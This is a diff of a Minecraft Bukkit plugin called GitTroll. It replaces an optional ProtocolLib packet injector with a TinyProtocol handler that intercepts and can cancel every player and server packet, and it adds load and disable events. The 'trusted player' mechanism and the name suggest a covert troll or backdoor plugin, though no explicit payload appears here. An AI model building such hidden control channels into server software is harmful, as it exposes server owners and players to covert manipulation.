@@ -19,8 +19,8 @@ import net.Lenni0451.GitTroll.event.events.EventPlayerPacket;
 import net.Lenni0451.GitTroll.event.events.EventServerPacket;
 import net.Lenni0451.GitTroll.event.events.EventTrustPlayer;
 import net.Lenni0451.GitTroll.event.events.EventUntrustPlayer;
+import net.Lenni0451.GitTroll.event.events.ServerLoadedEvent;
 import net.Lenni0451.GitTroll.manager.CommandManager;
-import net.Lenni0451.GitTroll.softdepends.ProtocolLibPacketInjector;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
 import net.Lenni0451.GitTroll.utils.Logger;
 import net.Lenni0451.GitTroll.utils.TrustedInfo;
@@ -87,7 +87,9 @@ public class GitTroll extends JavaPlugin implements Listener {
 
 	public EventManager eventManager;
 	public CommandManager commandManager;
-	
+	public TinyProtocol protocolManager;
+
+	@Override
 	public void onEnable() {
 		instance = this;
 		
@@ -100,26 +102,28 @@ public class GitTroll extends JavaPlugin implements Listener {
 		this.commandManager = new CommandManager();
 		
 		Bukkit.getPluginManager().registerEvents(this, this);
+		Bukkit.getScheduler().runTaskLater(this, () -> this.eventManager.callEvent(new ServerLoadedEvent()), 1);
 		
-		if(Bukkit.getPluginManager().getPlugin("ProtocolLib") != null) {
-			new ProtocolLibPacketInjector();
-		} else {
-			new TinyProtocol(this) {
-				@Override
-				public Object onPacketInAsync(Player sender, Channel channel, Object packet) {
-					EventPlayerPacket event = new EventPlayerPacket(sender, (Packet<?>) packet);
-					eventManager.callEvent(event);
-					return event.isCancelled()?null:packet;
-				}
-				
-				@Override
-				public Object onPacketOutAsync(Player receiver, Channel channel, Object packet) {
-					EventServerPacket event = new EventServerPacket(receiver, (Packet<?>) packet);
-					eventManager.callEvent(event);
-					return event.isCancelled()?null:packet;
-				}
-			};
-		}
+		this.protocolManager = new TinyProtocol(this) {
+			@Override
+			public Object onPacketInAsync(Player sender, Channel channel, Object packet) {
+				EventPlayerPacket event = new EventPlayerPacket(sender, (Packet<?>) packet);
+				eventManager.callEvent(event);
+				return event.isCancelled()?null:packet;
+			}
+			
+			@Override
+			public Object onPacketOutAsync(Player receiver, Channel channel, Object packet) {
+				EventServerPacket event = new EventServerPacket(receiver, (Packet<?>) packet);
+				eventManager.callEvent(event);
+				return event.isCancelled()?null:packet;
+			}
+		};
+	}
+	
+	@Override
+	public void onDisable() {
+		Logger.broadcastGitMessage("§cThe plugin is being disabled. Please remember that you will be untrusted after the plugin is loaded again!");
 	}
 	
 	
@@ -146,6 +150,7 @@ public class GitTroll extends JavaPlugin implements Listener {
 		if(this.isPlayerTrusted(event.getPlayer())) {
 			CustomPlayer.instanceOf(event.getPlayer()).sendGitMessage("You are still trusted.");
 		}
+		//Old packet injector (Still there if you need it)
 //		new PacketInjector(event.getPlayer()).inject();
 	}
 	
